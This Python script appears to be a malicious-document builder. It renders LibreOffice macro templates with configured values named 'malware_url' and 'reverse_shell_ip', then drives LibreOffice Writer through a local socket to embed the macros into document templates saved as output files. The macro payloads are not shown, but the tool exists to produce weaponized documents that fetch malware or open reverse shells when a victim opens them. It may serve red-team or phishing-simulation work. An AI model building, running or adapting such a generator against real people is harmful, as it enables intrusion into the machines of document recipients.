import subprocess
import os
import sys
import yaml
from jinja2 import Template
import threading
import time

cfg = None
parent_dir = os.path.dirname(os.path.abspath(__file__))
config_file = os.path.join(parent_dir, "config.yml")
template_dir = os.path.join(parent_dir, "templates")
output_dir = os.path.join(parent_dir, "output")

# Libre office imports
libre_office_utils = os.path.join(parent_dir, "utils", "libre_office")
writer_macro_import_file = os.path.join(libre_office_utils, "writer_macro_import.py")

with open(config_file, "r") as stream:
    try:
        cfg = yaml.safe_load(stream)
        libre_office_cfg = cfg["app"]["libre_office"]

    except yaml.YAMLError as exc:
        print(f"Error reading configuration from '{config_file}': {exc}")
        sys.exit(1)

def start_libreoffice_writer():
    cmd = f'start /min "" "{libre_office_cfg["exe"]}" --writer --accept="socket,host=localhost,port=2002;urp;"'
    subprocess.Popen(cmd, shell=True)

# 'start /min "c:/Program Files (x86)/LibreOffice 5/program/soffice.exe" --writer --accept="socket,host=localhost,port=2002;urp;"'
def create_tmp_macro_file(macro_path, macro_tmp_path):
    with open(macro_path, 'r') as macro_file:
        macro_template = Template(macro_file.read())

    rendered_macro = macro_template.render(
        malware_url=cfg["app"]["macros"]["malware_url"],
        reverse_shell_ip=cfg["app"]["macros"]["reverse_shell_ip"])

    # Create the directory if it doesn't exist
    os.makedirs(os.path.dirname(macro_tmp_path), exist_ok=True)

    with open(macro_tmp_path, "w") as tmp_macro_file:
        tmp_macro_file.write(rendered_macro)

def run_macro_import(template_file, macro_tmp_file, output_dir):
    # Insert a delay to allow some time for LibreOffice Writer to fully open
    time.sleep(5)
    
    cmd = f'"{libre_office_cfg["python"]}" "{writer_macro_import_file}" "{template_file}" "{macro_tmp_file}" "{output_dir}"'
    subprocess.Popen(cmd, shell=True)

def main(template_id, macro_id):
    # Get template path from config using template_id
    template_name = cfg['templates']["libre_office"]['writer'][template_id]
    template_file = os.path.join(template_dir, "files", "libre_office", template_name)

    # Create new macro tmp file with added values using jinja
    macro_name = cfg['macros']["libre_office"][macro_id]
    macro_path = os.path.join(template_dir, "macros", "libre_office", macro_name)
    macro_tmp_file = os.path.join(template_dir, "macros", "tmp", macro_name)
    create_tmp_macro_file(macro_path, macro_tmp_file)

    # Create output file
    output_file = os.path.join(output_dir, template_name)

    libreoffice_thread = threading.Thread(target=start_libreoffice_writer, daemon=True)
    macro_import_thread = threading.Thread(target=run_macro_import, args=(template_file, macro_tmp_file, output_dir))
    
    libreoffice_thread.start()
    macro_import_thread.start()


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python script.py <template_id> <macro_id>")
        sys.exit(1)

    template_id = int(sys.argv[1])
    macro_id = int(sys.argv[2])

    main(template_id, macro_id)

    